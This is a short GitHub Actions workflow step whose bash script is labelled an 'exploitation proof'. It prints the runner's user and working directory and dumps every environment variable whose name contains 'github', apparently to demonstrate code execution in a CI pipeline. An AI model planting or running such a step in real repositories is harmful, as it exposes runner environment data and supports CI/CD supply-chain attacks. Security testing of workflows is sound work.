      shell: bash
      run: |
        echo "==== EXPLOITATION PROOF START ===="
        echo "Current user: $(whoami)"
        echo "Current directory: $(pwd)"
        echo "GitHub environment variables:"
        env | grep -i github
        echo "==== EXPLOITATION PROOF END ===="
        
